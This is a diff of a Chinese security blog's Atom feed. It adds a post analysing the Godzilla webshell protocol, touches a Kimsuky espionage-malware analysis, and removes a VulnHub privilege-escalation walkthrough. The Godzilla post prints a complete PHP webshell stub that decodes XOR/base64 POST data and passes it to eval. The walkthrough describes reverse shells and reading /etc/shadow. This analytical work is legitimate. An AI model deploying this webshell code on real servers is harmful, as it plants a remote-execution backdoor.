@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-08-26T17:39:00.101Z</updated>
+  <updated>2021-09-03T19:05:46.542Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>哥斯拉整体过程刨析</title>
+    <link href="http://422926799.github.io/posts/befc239e.html"/>
+    <id>http://422926799.github.io/posts/befc239e.html</id>
+    <published>2021-09-03T13:27:25.000Z</published>
+    <updated>2021-09-03T19:05:46.542Z</updated>
+    
+    <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;本文主要是分析哥斯拉流量协议实现的过程&lt;/p&gt;
+&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;版本:v1.0&lt;br&gt;有效荷载:Phpdynxxxxx&lt;br&gt;加密器:php_xor_</summary>
+      
+    
+    
+    
+    
+    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Kimsuky 间谍活动分析</title>
     <link href="http://422926799.github.io/posts/5c51f955.html"/>
     <id>http://422926799.github.io/posts/5c51f955.html</id>
     <published>2021-08-26T17:25:04.000Z</published>
-    <updated>2021-08-26T17:39:00.101Z</updated>
+    <updated>2021-08-26T17:39:05.501Z</updated>
     
     <content type="html"><![CDATA[<p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p><p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p><p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p><p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p><p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p><p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p><p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p><p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p><p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p><p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p><p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p><p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p><p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p><p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p><p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>]]></content>
     
@@ -440,28 +463,6 @@ map to guest = Bad </summary>
     
     
     <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HackSudo Aliens靶场</title>
-    <link href="http://422926799.github.io/posts/be372d38.html"/>
-    <id>http://422926799.github.io/posts/be372d38.html</id>
-    <published>2021-06-06T16:48:20.000Z</published>
-    <updated>2021-06-06T17:08:13.809Z</updated>
-    
-    <content type="html"><![CDATA[<p>vulnhub的一个靶场<br>链接：<a href="http://www.vulnhub.com/entry/hacksudo-aliens,676/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/hacksudo-aliens,676/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/07/2dmTbj.png" alt=""></p><p>两个web，一个开了phpmyadmin<br>常规路径扫描<br><img src="https://z3.ax1x.com/2021/06/07/2dmban.png" alt=""></p><p>访问得到mysql.bak，拿到mysql连接凭证。phpmyadmin登录<br><img src="https://z3.ax1x.com/2021/06/07/2dmvxU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnPaR.png" alt=""></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>查看secure_file_priv，可以写shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnERK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dneMD.png" alt=""></p><p>用php_reverse_shell.php反弹个shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnMdA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnKZd.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>常规提权检测<br>1./etc/passwd是否可写<br>2.内核版本查询<br>3.suid和sudo查询<br>……<br>发现date有SUID权限，利用其读取/root/root.txt<br>拿到root.txt:)<br><img src="https://z3.ax1x.com/2021/06/07/2dnQII.png" alt=""></p><p>读取/root/.bash_history看到操作日志切换到hacksudo用户后给Downloads下的cpulimit设置了SUID<br><img src="https://z3.ax1x.com/2021/06/07/2dndds.png" alt=""></p><p>用date读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/07/2dnwon.png" alt=""></p><p>拿到hacksudo hash，john爆破得到明文<br><img src="https://z3.ax1x.com/2021/06/07/2dnBiq.png" alt=""></p><p>登录后拿到users.txt<br>利用cpulimit执行/bin/bash，获得root<br><img src="https://z3.ax1x.com/2021/06/07/2dnDJ0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnrWV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnszT.png" alt=""></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;vulnhub的一个靶场&lt;br&gt;链接：&lt;a href=&quot;http://www.vulnhub.com/entry/hacksudo-aliens,676/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entr</summary>
-      
-    
-    
-    
-    
-    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
     
   </entry>
   
